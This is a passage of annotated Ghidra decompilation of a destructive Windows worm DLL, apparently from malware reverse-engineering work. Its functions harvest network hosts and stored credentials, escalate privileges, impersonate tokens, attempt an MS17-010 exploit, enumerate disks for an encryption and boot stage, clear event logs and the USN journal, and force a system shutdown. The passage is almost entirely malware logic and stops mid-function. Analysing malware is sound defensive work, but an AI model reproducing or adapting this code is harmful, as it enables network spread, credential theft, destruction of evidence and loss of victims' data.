    pFVar1 = GetProcAddress(local_14,"GetExtendedTcpTable");
    if (pFVar1 == (FARPROC)0x0) {
      GetLastError();
    }
    else {
      dwBytes = 0x100000;
      DVar6 = 8;
      local_c = 0x100000;
      pvVar2 = GetProcessHeap();
      lpMem = HeapAlloc(pvVar2,DVar6,dwBytes);
      local_10 = lpMem;
      if (lpMem != (uint *)0x0) {
        iVar3 = (*pFVar1)(lpMem,&local_c,0,2,1,0);
        bVar5 = iVar3 == 0;
        if ((bVar5) && (local_8 = 0, *lpMem != 0)) {
          pbVar4 = (byte *)((int)lpMem + 0x12);
          do {
            if (*(int *)(pbVar4 + -0xe) == 5) {
              wsprintfW(local_54,L"%u.%u.%u.%u",(uint)pbVar4[-2],(uint)pbVar4[-1],(uint)*pbVar4,
                        (uint)pbVar4[1]);
              QueueNetworkHostFromArgument_10006FC7(param_1);
              lpMem = local_10;
            }
            local_8 = local_8 + 1;
            pbVar4 = pbVar4 + 0x14;
          } while (local_8 < *lpMem);
        }
        DVar6 = 0;
        pvVar2 = GetProcessHeap();
        HeapFree(pvVar2,DVar6,lpMem);
      }
    }
    FreeLibrary(local_14);
  }
  return bVar5;
}



/*
 * RECONSTRUCTED FUNCTION: EnumerateArpNeighborCandidates_1000786B
 * Ghidra symbol: FUN_1000786b | VA: 0x1000786B | original source line: 6869
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetIpNetTable, GetProcessHeap
 * Direct function references: QueueNetworkHostFromArgument_10006FC7
 */
undefined4 EnumerateArpNeighborCandidates_1000786B(LPCRITICAL_SECTION param_1)

{
  int iVar1;
  HANDLE pvVar2;
  uint *lpMem;
  int iVar3;
  byte *pbVar4;
  byte *pbVar5;
  byte *pbVar6;
  bool bVar7;
  bool bVar8;
  DWORD DVar9;
  SIZE_T dwBytes;
  WCHAR local_58 [32];
  byte local_18 [4];
  undefined4 local_14;
  uint *local_10;
  uint local_c;
  SIZE_T local_8;
  
  local_14 = 0;
  local_8 = 0;
  iVar1 = GetIpNetTable(0,&local_8,0);
  if (iVar1 == 0xe8) {
    local_14 = 0;
  }
  else if (iVar1 == 0x7a) {
    DVar9 = 0;
    dwBytes = local_8;
    pvVar2 = GetProcessHeap();
    lpMem = HeapAlloc(pvVar2,DVar9,dwBytes);
    if (lpMem != (uint *)0x0) {
      local_10 = lpMem;
      iVar1 = GetIpNetTable(lpMem,&local_8,0);
      if (iVar1 == 0) {
        local_14 = 1;
        local_c = 0;
        if (*lpMem != 0) {
          local_18[0] = 3;
          local_18[1] = 0;
          local_18[2] = 0;
          local_18[3] = 0;
          pbVar4 = (byte *)((int)lpMem + 0x16);
          do {
            iVar1 = 4;
            bVar7 = false;
            iVar3 = 0;
            bVar8 = true;
            pbVar5 = pbVar4 + 2;
            pbVar6 = local_18;
            do {
              if (iVar1 == 0) break;
              iVar1 = iVar1 + -1;
              bVar7 = *pbVar5 < *pbVar6;
              bVar8 = *pbVar5 == *pbVar6;
              pbVar5 = pbVar5 + 1;
              pbVar6 = pbVar6 + 1;
            } while (bVar8);
            if (!bVar8) {
              iVar3 = (1 - (uint)bVar7) - (uint)(bVar7 != 0);
            }
            if (iVar3 == 0) {
              wsprintfW(local_58,L"%u.%u.%u.%u",(uint)pbVar4[-2],(uint)pbVar4[-1],(uint)*pbVar4,
                        (uint)pbVar4[1]);
              QueueNetworkHostFromArgument_10006FC7(param_1);
            }
            local_c = local_c + 1;
            pbVar4 = pbVar4 + 0x18;
          } while (local_c < *local_10);
          lpMem = local_10;
        }
      }
      DVar9 = 0;
      pvVar2 = GetProcessHeap();
      HeapFree(pvVar2,DVar9,lpMem);
    }
  }
  return local_14;
}



/*
 * RECONSTRUCTED FUNCTION: EnumerateWindowsServers_1000795A
 * Ghidra symbol: FUN_1000795a | VA: 0x1000795A | original source line: 6952
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: NetServerEnum, NetApiBufferFree
 * Direct function references: QueueNetworkHostFromArgument_10006FC7
 */
undefined4 EnumerateWindowsServers_1000795A(LPCRITICAL_SECTION param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 local_14;
  undefined4 local_10;
  uint local_c;
  int local_8;
  
  local_8 = 0;
  local_c = 0;
  local_14 = 0;
  local_10 = 0;
  iVar1 = NetServerEnum(0,0x65,&local_8,0xffffffff,&local_c,&local_14,param_2,param_3,&local_10);
  if ((iVar1 == 0) || (iVar1 == 0xea)) {
    param_3 = 1;
    if (local_8 == 0) {
      return 1;
    }
    uVar2 = 0;
    if (local_c != 0) {
      puVar3 = (undefined4 *)(local_8 + 4);
      do {
        if (puVar3 == (undefined4 *)0x4) break;
        if ((puVar3[3] & 0x80000000) == 0) {
          if ((puVar3[-1] == 500) && (4 < ((byte)puVar3[1] & 0xf))) {
            QueueNetworkHostFromArgument_10006FC7(param_1);
          }
        }
        else {
          EnumerateWindowsServers_1000795A(param_1,3,*puVar3);
        }
        puVar3 = puVar3 + 6;
        uVar2 = uVar2 + 1;
      } while (uVar2 < local_c);
    }
  }
  else {
    param_3 = 0;
  }
  if (local_8 != 0) {
    NetApiBufferFree(local_8);
  }
  return param_3;
}



/*
 * RECONSTRUCTED FUNCTION: EnumerateNetworkResourcesRecursively_10007A17
 * Ghidra symbol: FUN_10007a17 | VA: 0x10007A17 | original source line: 7002
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: WNetOpenEnumW, WNetEnumResourceW, WNetCloseEnum
 * Direct function references: QueueNetworkHostFromArgument_10006FC7
 */
undefined4 EnumerateNetworkResourcesRecursively_10007A17(LPCRITICAL_SECTION param_1,LPNETRESOURCEW param_2)

{
  short *psVar1;
  DWORD DVar2;
  HGLOBAL _Dst;
  int iVar3;
  short sVar4;
  undefined4 *puVar5;
  HANDLE local_14;
  undefined4 local_10;
  LPNETRESOURCEW local_c;
  DWORD local_8;
  
  local_c = (LPNETRESOURCEW)0xffffffff;
  local_10 = 0;
  local_8 = 0x4000;
  DVar2 = WNetOpenEnumW(1,0,0,param_2,&local_14);
  if ((DVar2 == 0) && (_Dst = GlobalAlloc(0x40,local_8), _Dst != (HGLOBAL)0x0)) {
    local_10 = 1;
    while( true ) {
      memset(_Dst,0,local_8);
      DVar2 = WNetEnumResourceW(local_14,(LPDWORD)&local_c,_Dst,&local_8);
      if (DVar2 != 0) break;
      param_2 = (LPNETRESOURCEW)0x0;
      if (local_c != (LPNETRESOURCEW)0x0) {
        puVar5 = (undefined4 *)((int)_Dst + 0x14);
        do {
          iVar3 = 2;
          if (((byte)puVar5[-2] & 2) == 2) {
            EnumerateNetworkResourcesRecursively_10007A17(param_1,(LPNETRESOURCEW)(puVar5 + -5));
          }
          else {
            psVar1 = (short *)*puVar5;
            if (((psVar1 != (short *)0x0) && (*psVar1 == 0x5c)) && (psVar1[1] == 0x5c)) {
              sVar4 = psVar1[2];
              if (sVar4 != 0) {
                do {
                  if (sVar4 == 0x5c) break;
                  iVar3 = iVar3 + 1;
                  sVar4 = psVar1[iVar3];
                } while (sVar4 != 0);
              }
              psVar1[iVar3] = 0;
              QueueNetworkHostFromArgument_10006FC7(param_1);
            }
          }
          param_2 = (LPNETRESOURCEW)((int)&param_2->dwScope + 1);
          puVar5 = puVar5 + 8;
        } while (param_2 < local_c);
      }
    }
    if (DVar2 != 0x103) {
      local_10 = 0;
    }
    GlobalFree(_Dst);
    WNetCloseEnum(local_14);
  }
  return local_10;
}



/*
 * RECONSTRUCTED FUNCTION: EnumerateStoredWindowsCredentials_10007B31
 * Ghidra symbol: FUN_10007b31 | VA: 0x10007B31 | original source line: 7065
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: QueueNetworkTargetWithCredentials_10006DE0, QueueNetworkHostFromArgument_10006FC7
 */
int EnumerateStoredWindowsCredentials_10007B31(LPCRITICAL_SECTION param_1)

{
  int iVar1;
  int iVar2;
  ushort *puVar3;
  int iVar4;
  ushort *puVar5;
  uint local_14;
  int local_10;
  int local_c;
  uint local_8;
  
  local_c = 0;
  local_8 = 0;
  iVar2 = CredEnumerateW(0,0,&local_8,&local_c);
  if (iVar2 != 0) {
    local_14 = 0;
    if (local_8 != 0) {
      do {
        iVar1 = *(int *)(local_c + local_14 * 4);
        puVar3 = *(ushort **)(iVar1 + 8);
        if (puVar3 == (ushort *)0x0) {
LAB_10007bdb:
          if (*(int *)(iVar1 + 4) == 2) goto LAB_10007be1;
        }
        else {
          local_10 = 8;
          puVar5 = &DAT_100140bc;
          do {
            if (*puVar3 != *puVar5) {
              iVar4 = (-(uint)(*puVar3 < *puVar5) & 0xfffffffe) + 1;
              goto LAB_10007b9f;
            }
            puVar3 = puVar3 + 1;
            puVar5 = puVar5 + 1;
            local_10 = local_10 + -1;
          } while (local_10 != 0);
          iVar4 = 0;
LAB_10007b9f:
          if ((iVar4 != 0) || (*(int *)(iVar1 + 4) != 1)) goto LAB_10007bdb;
          if ((*(int *)(iVar1 + 0x30) != 0) && (*(int *)(iVar1 + 0x1c) != 0)) {
            QueueNetworkTargetWithCredentials_10006DE0(*(short **)(iVar1 + 0x30),*(short **)(iVar1 + 0x1c),0);
          }
LAB_10007be1:
          QueueNetworkHostFromArgument_10006FC7(param_1);
        }
        local_14 = local_14 + 1;
      } while (local_14 < local_8);
    }
    CredFree(local_c);
  }
  return iVar2;
}



/*
 * RECONSTRUCTED FUNCTION: NetworkDiscoveryCoordinator_10007C10
 * Ghidra symbol: FUN_10007c10 | VA: 0x10007C10 | original source line: 7122
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetComputerNameExW, CreateThread
 * Direct function references: QueueNetworkHostFromArgument_10006FC7, EnumerateTcpConnectionCandidates_1000777B, EnumerateArpNeighborCandidates_1000786B, EnumerateWindowsServers_1000795A, DiscoverNetworkInterfaceSubnets_10008E7F
 */
void NetworkDiscoveryCoordinator_10007C10(void)

{
  bool bVar1;
  LPCRITICAL_SECTION lpParameter;
  BOOL BVar2;
  WCHAR local_210 [260];
  DWORD local_8;
  
  lpParameter = DAT_1001f140;
  QueueNetworkHostFromArgument_10006FC7(DAT_1001f140);
  QueueNetworkHostFromArgument_10006FC7(lpParameter);
  local_8 = 0x104;
  BVar2 = GetComputerNameExW(ComputerNamePhysicalNetBIOS,local_210,&local_8);
  if (BVar2 != 0) {
    QueueNetworkHostFromArgument_10006FC7(lpParameter);
  }
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,DiscoverNetworkInterfaceSubnets_10008E7F,lpParameter,0,(LPDWORD)0x0);
  bVar1 = false;
  do {
    EnumerateTcpConnectionCandidates_1000777B(lpParameter);
    EnumerateArpNeighborCandidates_1000786B(lpParameter);
    if (!bVar1) {
      EnumerateWindowsServers_1000795A(lpParameter,0x80000000,0);
      bVar1 = true;
    }
    Sleep(180000);
  } while( true );
}



/*
 * RECONSTRUCTED FUNCTION: WorkerCompletionCallback_10007CA5
 * Ghidra symbol: FUN_10007ca5 | VA: 0x10007CA5 | original source line: 7154
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined1 WorkerCompletionCallback_10007CA5(char *param_1,char *param_2,int param_3)

{
  char cVar1;
  char cVar2;
  
  do {
    if (param_3 == 0) {
      return 1;
    }
    param_3 = param_3 + -1;
    cVar2 = *param_2;
    cVar1 = *param_1;
    param_1 = param_1 + 1;
    param_2 = param_2 + 1;
  } while (cVar1 == cVar2);
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

/*
 * RECONSTRUCTED FUNCTION: InitializeGlobalExecutionState_10007CC0
 * Ghidra symbol: FUN_10007cc0 | VA: 0x10007CC0 | original source line: 7177
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetTickCount, GetModuleFileNameW
 * Direct function references: AttemptToEnableNamedPrivilege_100081BA, DeriveRuntimeMaskFromProcessList_10008677, ReadSelfModuleIntoHeapBuffer_10008ACF
 */
void InitializeGlobalExecutionState_10007CC0(void)

{
  BOOL BVar1;
  DWORD DVar2;
  uint uVar3;
  
  if (DAT_1001f114 == 0) {
    g_start_tick_count = GetTickCount();
    BVar1 = AttemptToEnableNamedPrivilege_100081BA(L"SeShutdownPrivilege");
    uVar3 = (uint)(BVar1 != 0);
    BVar1 = AttemptToEnableNamedPrivilege_100081BA(L"SeDebugPrivilege");
    if (BVar1 != 0) {
      uVar3 = uVar3 | 2;
    }
    BVar1 = AttemptToEnableNamedPrivilege_100081BA(L"SeTcbPrivilege");
    if (BVar1 != 0) {
      uVar3 = uVar3 | 4;
    }
    g_privilege_and_execution_flags = uVar3;
    _DAT_1001f104 = DeriveRuntimeMaskFromProcessList_10008677();
    DVar2 = GetModuleFileNameW(DAT_1001f120,&g_original_dll_path,0x30c);
    if (DVar2 != 0) {
      ReadSelfModuleIntoHeapBuffer_10008ACF();
      return;
    }
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: DllProcessAttach_GhidraEntry
 * Ghidra symbol: entry | VA: 0x10007D39 | original source line: 7209
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined4 DllProcessAttach_GhidraEntry(HMODULE param_1,int param_2)

{
  if (param_2 == 1) {
    DAT_1001f120 = param_1;
    DisableThreadLibraryCalls(param_1);
  }
  return 1;
}



/*
 * RECONSTRUCTED FUNCTION: NetworkOperationUnderToken_10007D58
 * Ghidra symbol: FUN_10007d58 | VA: 0x10007D58 | original source line: 7221
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: InspectTokenGroupMembership_10008BC6
 */
undefined4 NetworkOperationUnderToken_10007D58(int *param_1)

{
  int iVar1;
  
  iVar1 = InspectTokenGroupMembership_10008BC6();
  if (param_1 != (int *)0x0) {
    *param_1 = iVar1;
  }
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: LocalProcessProbe_10007D6F
 * Ghidra symbol: FUN_10007d6f | VA: 0x10007D6F | original source line: 7235
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: DeriveWindowsMarkerPath_10008320, TryMs17010ExploitAgainstRemoteHost_100096C7
 */
undefined4 LocalProcessProbe_10007D6F(short *param_1)

{
  short sVar1;
  short *psVar2;
  int iVar3;
  BOOL BVar4;
  undefined4 uVar5;
  WCHAR local_61c [780];
  
  uVar5 = 0;
  if ((DAT_1001f0fc != 0) && (DAT_1001f11c != 0)) {
    psVar2 = param_1;
    do {
      sVar1 = *psVar2;
      psVar2 = psVar2 + 1;
    } while (sVar1 != 0);
    iVar3 = TryMs17010ExploitAgainstRemoteHost_100096C7(L"127.0.0.1",param_1,(int)psVar2 - (int)(param_1 + 1) >> 1);
    if (iVar3 != 0) {
      Sleep(3000);
      iVar3 = DeriveWindowsMarkerPath_10008320(local_61c);
      if (iVar3 != 0) {
        BVar4 = PathFileExistsW(local_61c);
        if (BVar4 != 0) {
          uVar5 = 1;
        }
      }
    }
  }
  return uVar5;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

/*
 * RECONSTRUCTED FUNCTION: ExportOrdinal1MainDispatcher_10007DEB
 * Ghidra symbol: FUN_10007deb | VA: 0x10007DEB | original source line: 7271
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: Ordinal_115, CreateThread, GetLastError, GetProcessHeap, GetVersionExW, GetModuleHandleA, GetProcAddress
 * Direct function references: EnumerateFixedDisksAndSpawnWorkers_10001EEF, ParseRuntimeContext_10006A2B, ComposeNetworkWorkItemParameters_10006BB0, FreeNetworkTargetEntry_10006CAA, CreateWorkerQueue_10007091, SynchronizeWorkerThreads_100070FA, AppendNetworkQueueEntry_10007298, LaunchEmbeddedAuxiliaryResource_10007545, NetworkDiscoveryCoordinator_10007C10, InitializeGlobalExecutionState_10007CC0, NetworkOperationUnderToken_10007D58, LocalProcessProbe_10007D6F, DeriveExecutionTimingWindows_10008282, EnforceSingleInstanceMarker_1000835E, SpawnHiddenCommandInterpreter_100083BD, ScheduleDelayedRestart_100084DF, CollectAccessibleSecurityTokens_1000875A, ExtractDllhostResource_10008999
 * ANALYST OBSERVATION: This is the exported ordinal-1 dispatcher (0x10007DEB), distinct from PE entry point 0x10007D39.
 * ANALYST OBSERVATION: Contains privilege-gated, file-encryption, worker, and restart logic.
 */
void ExportOrdinal1MainDispatcher_10007DEB(uint param_1,HANDLE param_2,LPCWSTR param_3,HANDLE param_4)

{
  uint uVar1;
  BOOL BVar2;
  DWORD DVar3;
  HANDLE pvVar4;
  int iVar5;
  HMODULE hModule;
  FARPROC pFVar6;
  undefined4 *puVar7;
  SIZE_T dwBytes;
  int *lpMem;
  WCHAR local_4a1c [8192];
  WCHAR local_a1c [1023];
  undefined2 local_21e;
  undefined4 local_21c [64];
  _OSVERSIONINFOW local_11c;
  int *local_8;
  
                    // 0x7deb  1  
  local_8 = (HANDLE)0x10007df8;
  InitializeGlobalExecutionState_10007CC0();
  if (param_4 != (HANDLE)0xffffffff) {
    MapAndReenterMemoryImage_10009590(param_1,param_2,param_3);
  }
  Ordinal_115(0x202,&DAT_1001f768);
  DAT_1001f140 = CreateWorkerQueue_10007091(0x24,0x10006eda,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xffff);
  DAT_1001f108 = CreateWorkerQueue_10007091(8,0x10006c74,(PRTL_CRITICAL_SECTION_DEBUG)FreeNetworkTargetEntry_10006CAA,0xff);
  DAT_1001f110 = (LPCRITICAL_SECTION)0x0;
  InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_1001f124);
  ParseRuntimeContext_10006A2B(param_3);
  if ((g_privilege_and_execution_flags & 2) != 0) {
    EnforceSingleInstanceMarker_1000835E();
    DispatchDiskBootStage_10008D5A();
  }
  ScheduleDelayedRestart_100084DF();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,NetworkDiscoveryCoordinator_10007C10,(LPVOID)0x0,0,(LPDWORD)0x0);
  if (((g_privilege_and_execution_flags & 2) != 0) && ((g_runtime_feature_flags & 1) != 0)) {
    LaunchEmbeddedAuxiliaryResource_10007545();
  }
  SynchronizeWorkerThreads_100070FA();
  if ((g_runtime_feature_flags & 2) != 0) {
    ExtractDllhostResource_10008999(g_privilege_and_execution_flags & 6);
  }
  if ((g_privilege_and_execution_flags & 4) != 0) {
    DAT_1001f110 = CreateWorkerQueue_10007091(4,0x10007ca5,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xff);
    uVar1 = CollectAccessibleSecurityTokens_1000875A((int)local_21c);
    if (uVar1 != 0) {
      puVar7 = local_21c;
      param_1 = uVar1;
      do {
        local_8 = (int *)*puVar7;
        param_3 = (LPCWSTR)0x0;
        param_2 = (HANDLE)0x0;
        param_3 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,ImpersonatedNetworkWorker_10009F8E,(LPVOID)0x0,4,(LPDWORD)0x0)
        ;
        if (param_3 == (LPCWSTR)0x0) {
          param_2 = (HANDLE)0x57;
        }
        else {
          BVar2 = SetThreadToken(&param_3,local_8);
          if (BVar2 == 0) {
            param_2 = (HANDLE)GetLastError();
          }
          else {
            DVar3 = ResumeThread(param_3);
            if (DVar3 != 0xffffffff) goto LAB_10007f70;
          }
          CloseHandle(param_3);
        }
LAB_10007f70:
        SetLastError((DWORD)param_2);
        param_2 = (HANDLE)*puVar7;
        param_3 = (LPCWSTR)0x0;
        param_4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,NetworkOperationUnderToken_10007D58,&param_3,4,(LPDWORD)0x0);
        if (param_4 != (HANDLE)0x0) {
          BVar2 = SetThreadToken(&param_4,param_2);
          if (BVar2 != 0) {
            DVar3 = ResumeThread(param_4);
            if (DVar3 == 0xffffffff) {
              GetLastError();
            }
            else {
              WaitForSingleObject(param_4,0xffffffff);
            }
          }
          CloseHandle(param_4);
        }
        if (param_3 != (LPCWSTR)0x0) {
          AppendNetworkQueueEntry_10007298(DAT_1001f110,puVar7,0);
        }
        puVar7 = puVar7 + 1;
        param_1 = param_1 - 1;
      } while (param_1 != 0);
    }
  }
  SynchronizeWorkerThreads_100070FA();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,NetworkWorkerScheduler_1000A0FE,(LPVOID)0x0,0,(LPDWORD)0x0);
  param_4 = (HANDLE)0x0;
  param_1 = 0;
  param_3 = (LPCWSTR)0x0;
  param_2 = (HANDLE)0x0;
  DeriveExecutionTimingWindows_10008282((uint *)&param_4,&param_1,(uint *)&param_3,(uint *)&param_2);
  dwBytes = 4;
  DVar3 = 8;
  pvVar4 = GetProcessHeap();
  local_8 = HeapAlloc(pvVar4,DVar3,dwBytes);
  if (local_8 != (int *)0x0) {
    *local_8 = (int)param_3 * 60000;
    pvVar4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,DeferredNetworkWorker_1000A274,local_8,0,(LPDWORD)0x0);
    if (pvVar4 == (HANDLE)0x0) {
      DVar3 = 0;
      lpMem = local_8;
      pvVar4 = GetProcessHeap();
      HeapFree(pvVar4,DVar3,lpMem);
    }
  }
  Sleep((int)param_4 * 60000);
  if ((g_runtime_feature_flags & 0x10) != 0) {
    EnumerateFixedDisksAndSpawnWorkers_10001EEF();
  }
  Sleep((int)param_2 * 60000);
  if ((g_privilege_and_execution_flags & 2) == 0) {
    memset(&local_11c,0,0x114);
    local_11c.dwOSVersionInfoSize = 0x114;
    BVar2 = GetVersionExW(&local_11c);
    if ((BVar2 != 0) &&
       (((local_11c.dwMajorVersion == 5 &&
         ((local_11c.dwMinorVersion == 1 || (local_11c.dwMinorVersion == 2)))) ||
        ((local_11c.dwMajorVersion == 6 &&
         ((local_11c.dwMinorVersion == 0 || (local_11c.dwMinorVersion == 1)))))))) {
      ComposeNetworkWorkItemParameters_10006BB0(local_4a1c);
      iVar5 = LocalProcessProbe_10007D6F(local_4a1c);
      if (iVar5 != 0) goto LAB_10008114;
    }
  }
  Sleep(param_1 * 60000);
  wsprintfW(local_a1c,
            L"wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:"
            ,(uint)g_original_dll_path);
  local_21e = 0;
  SpawnHiddenCommandInterpreter_100083BD(3);
  if ((g_privilege_and_execution_flags & 1) != 0) {
    hModule = GetModuleHandleA("ntdll.dll");
    if ((hModule != (HMODULE)0x0) &&
       (pFVar6 = GetProcAddress(hModule,"NtRaiseHardError"), pFVar6 != (FARPROC)0x0)) {
      (*pFVar6)(0xc0000350,0,0,0,6,&param_3);
    }
    BVar2 = InitiateSystemShutdownExW((LPWSTR)0x0,(LPWSTR)0x0,0,1,1,0x80000000);
    if (BVar2 == 0) {
      ExitWindowsEx(6,0);
    }
  }
LAB_10008114:
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



/*
 * RECONSTRUCTED FUNCTION: AttemptToEnableNamedPrivilege_100081BA
 * Ghidra symbol: FUN_100081ba | VA: 0x100081BA | original source line: 7432
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetCurrentProcess, GetLastError
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> privilege_name
 * ANALYST OBSERVATION: Attempts to enable an explicitly named privilege. Call results require runtime verification.
 */
BOOL AttemptToEnableNamedPrivilege_100081BA(LPCWSTR privilege_name)

{
  HANDLE ProcessHandle;
  BOOL BVar1;
  BOOL BVar2;
  DWORD DesiredAccess;
  HANDLE *TokenHandle;
  _TOKEN_PRIVILEGES local_1c;
  DWORD local_c;
  HANDLE local_8;
  
  local_1c.PrivilegeCount = 0;
  local_1c.Privileges[0].Luid.LowPart = 0;
  local_1c.Privileges[0].Luid.HighPart = 0;
  local_1c.Privileges[0].Attributes = 0;
  TokenHandle = &local_8;
  DesiredAccess = 0x28;
  BVar2 = 0;
  local_c = 0;
  local_8 = (HANDLE)0x0;
  ProcessHandle = GetCurrentProcess();
  BVar1 = OpenProcessToken(ProcessHandle,DesiredAccess,TokenHandle);
  if (BVar1 != 0) {
    BVar1 = LookupPrivilegeValueW((LPCWSTR)0x0,privilege_name,&local_1c.Privileges[0].Luid);
    if (BVar1 != 0) {
      local_1c.PrivilegeCount = 1;
      local_1c.Privileges[0].Attributes = 2;
      BVar2 = AdjustTokenPrivileges(local_8,0,&local_1c,0,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0);
      local_c = GetLastError();
      if (local_c != 0) {
        BVar2 = 0;
      }
    }
  }
  SetLastError(local_c);
  return BVar2;
}



/*
 * RECONSTRUCTED FUNCTION: Unresolvedroutine_10008243
 * Ghidra symbol: FUN_10008243 | VA: 0x10008243 | original source line: 7473
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: NetServerGetInfo, NetApiBufferFree
 * Direct function references: none mapped
 */
undefined4 Unresolvedroutine_10008243(void)

{
  DWORD DVar1;
  ushort unaff_SI;
  undefined4 uVar2;
  char acStack_12 [2];
  int iVar3;
  
  uVar2 = 0;
  iVar3 = 0;
  DVar1 = NetServerGetInfo((char *)0x0,0x65,acStack_12 + 10,unaff_SI,(ushort *)0x0);
  if ((DVar1 == 0) &&
     (((*(uint *)(iVar3 + 0x10) & 0x8000) != 0 || ((*(uint *)(iVar3 + 0x10) & 0x18) != 0)))) {
    uVar2 = 1;
  }
  if (iVar3 != 0) {
    NetApiBufferFree();
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: DeriveExecutionTimingWindows_10008282
 * Ghidra symbol: FUN_10008282 | VA: 0x10008282 | original source line: 7497
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: NetServerGetInfo, NetApiBufferFree
 * Direct function references: ComputeElapsedTimeInterval_10006973
 */
void DeriveExecutionTimingWindows_10008282(uint *param_1,uint *param_2,uint *param_3,uint *param_4)

{
  uint uVar1;
  bool bVar2;
  uint uVar3;
  DWORD DVar4;
  uint uVar5;
  uint uVar6;
  ushort *unaff_ESI;
  ushort unaff_DI;
  bool bVar7;
  int local_8;
  
  uVar3 = ComputeElapsedTimeInterval_10006973();
  bVar7 = 0x55 < uVar3;
  bVar2 = false;
  uVar1 = uVar3 - 0x55;
  local_8 = 0;
  DVar4 = NetServerGetInfo((char *)0x0,0x65,(char *)&local_8,unaff_DI,unaff_ESI);
  if ((DVar4 == 0) && ((*(byte *)(local_8 + 0x10) & 0x18) != 0)) {
    bVar2 = true;
  }
  if (local_8 != 0) {
    NetApiBufferFree(local_8);
  }
  if (bVar2) {
    uVar3 = uVar3 + 0xf;
  }
  uVar5 = uVar3 / 3;
  if (uVar3 < 0x56) {
    uVar6 = -(uint)(0xf < uVar3) & uVar3 - 0xf;
  }
  else {
    uVar6 = 0x46;
  }
  if (0xf < uVar3) {
    uVar3 = 0xf;
  }
  if (param_1 != (uint *)0x0) {
    *param_1 = -(uint)bVar7 & uVar1;
  }
  if (param_3 != (uint *)0x0) {
    *param_3 = uVar5;
  }
  if (param_4 != (uint *)0x0) {
    *param_4 = uVar6;
  }
  if (param_2 != (uint *)0x0) {
    *param_2 = uVar3;
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: DeriveWindowsMarkerPath_10008320
 * Ghidra symbol: FUN_10008320 | VA: 0x10008320 | original source line: 7553
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> marker_path_out
 */
undefined4 DeriveWindowsMarkerPath_10008320(LPWSTR marker_path_out)

{
  LPWSTR pWVar1;
  undefined4 uVar2;
  
  uVar2 = 0;
  pWVar1 = PathFindFileNameW(&g_original_dll_path);
  pWVar1 = PathCombineW(marker_path_out,L"C:\\Windows\\",pWVar1);
  if (pWVar1 != (LPWSTR)0x0) {
    pWVar1 = PathFindExtensionW(marker_path_out);
    if (pWVar1 != (LPWSTR)0x0) {
      *pWVar1 = L'\0';
      uVar2 = 1;
    }
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: EnforceSingleInstanceMarker_1000835E
 * Ghidra symbol: FUN_1000835e | VA: 0x1000835E | original source line: 7574
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateFileW
 * Direct function references: DeriveWindowsMarkerPath_10008320
 */
bool EnforceSingleInstanceMarker_1000835E(void)

{
  int iVar1;
  BOOL BVar2;
  HANDLE pvVar3;
  bool bVar4;
  WCHAR local_61c [780];
  
  bVar4 = false;
  iVar1 = DeriveWindowsMarkerPath_10008320(local_61c);
  if (iVar1 != 0) {
    BVar2 = PathFileExistsW(local_61c);
    if (BVar2 != 0) {
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
    pvVar3 = CreateFileW(local_61c,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x4000000,(HANDLE)0x0);
    bVar4 = pvVar3 != (HANDLE)0xffffffff;
  }
  return bVar4;
}



/*
 * RECONSTRUCTED FUNCTION: SpawnHiddenCommandInterpreter_100083BD
 * Ghidra symbol: FUN_100083bd | VA: 0x100083BD | original source line: 7599
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetEnvironmentVariableW, GetSystemDirectoryW, CreateProcessW
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> delay_seconds
 */
BOOL SpawnHiddenCommandInterpreter_100083BD(int delay_seconds)

{
  int in_EAX;
  DWORD DVar1;
  UINT UVar2;
  LPWSTR pWVar3;
  _PROCESS_INFORMATION *p_Var4;
  _STARTUPINFOW *p_Var5;
  BOOL BVar6;
  int iVar7;
  WCHAR local_e70 [1024];
  WCHAR local_670 [780];
  _STARTUPINFOW local_58;
  _PROCESS_INFORMATION local_14;
  
  wsprintfW(local_e70,L"/c %ws");
